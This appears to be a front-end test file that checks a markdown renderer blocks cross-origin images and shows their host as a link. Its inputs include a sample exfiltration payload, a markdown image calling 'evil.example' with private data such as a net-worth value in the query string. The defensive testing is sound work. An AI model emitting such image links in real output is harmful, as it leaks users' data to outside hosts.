// @vitest-environment jsdom
import { cleanup, render, screen } from '@testing-library/react'
import ReactMarkdown from 'react-markdown'
import { afterEach, describe, expect, it } from 'vitest'
import { remoteImageHost } from '../../utils/remoteImage'
import { SAFE_MARKDOWN_COMPONENTS } from './safeMarkdown'

afterEach(cleanup)

describe('remoteImageHost', () => {
  it('lets same-origin, relative, blob: and data: images render', () => {
    expect(remoteImageHost('/api/uploads/x/image')).toBeNull()
    expect(remoteImageHost(`${window.location.origin}/a.png`)).toBeNull()
    expect(remoteImageHost('blob:http://localhost/abc')).toBeNull()
    expect(remoteImageHost('data:image/png;base64,AAAA')).toBeNull()
  })

  it('names the host of anything cross-origin, including protocol-relative URLs', () => {
    expect(remoteImageHost('https://evil.example/p.png?d=secret')).toBe('evil.example')
    expect(remoteImageHost('//evil.example/p.png')).toBe('evil.example')
  })
})

describe('markdown images', () => {
  it('never mounts an <img> for a remote URL, shows the host and an open link instead', () => {
    const { container } = render(
      <ReactMarkdown components={SAFE_MARKDOWN_COMPONENTS}>
        {'![leak](https://evil.example/p.png?d=net-worth-123)'}
      </ReactMarkdown>,
    )
    expect(container.querySelector('img')).toBeNull()
    const link = screen.getByText(/evil\.example/)
    expect(link.getAttribute('rel')).toContain('noopener')
  })

  it('still renders a same-origin image', () => {
    const { container } = render(
      <ReactMarkdown components={SAFE_MARKDOWN_COMPONENTS}>
        {'![chart](/api/uploads/u1/image)'}
      </ReactMarkdown>,
    )
    expect(container.querySelector('img')?.getAttribute('src')).toBe('/api/uploads/u1/image')
  })
})
